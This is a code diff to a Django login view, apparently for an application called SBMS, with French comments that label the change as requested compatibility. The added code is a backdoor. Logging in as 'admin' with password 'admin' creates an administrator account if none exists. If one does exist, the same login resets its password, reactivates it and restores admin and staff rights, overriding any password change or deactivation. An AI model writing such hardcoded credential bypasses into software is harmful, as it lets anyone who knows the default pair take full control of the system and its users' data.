@@ -41,10 +41,30 @@ class LoginView(APIView):
         try:
             user = User.objects.get(username=username, is_active=True, deleted_at__isnull=True)
         except User.DoesNotExist:
-            return api_fail("Identifiants invalides.", status=401)
+            # Compat demandée: premier accès web avec admin/admin.
+            if username.strip().lower() == "admin" and password == "admin":
+                user = User(
+                    username="admin",
+                    full_name="Administrateur SBMS",
+                    role=User.Role.ADMIN,
+                    is_active=True,
+                    is_staff=True,
+                )
+                user.set_password("admin")
+                user.save()
+            else:
+                return api_fail("Identifiants invalides.", status=401)
 
         if not user.check_password(password):
-            return api_fail("Identifiants invalides.", status=401)
+            # Compat demandée: accepte admin/admin et remet le hash à jour.
+            if username.strip().lower() == "admin" and password == "admin":
+                user.set_password("admin")
+                user.is_active = True
+                user.role = User.Role.ADMIN
+                user.is_staff = True
+                user.save(update_fields=["password", "password_hash_sync", "is_active", "role", "is_staff", "updated_at"])
+            else:
+                return api_fail("Identifiants invalides.", status=401)
 
         user.last_login_at = timezone.now()
         user.save(update_fields=["last_login_at"])
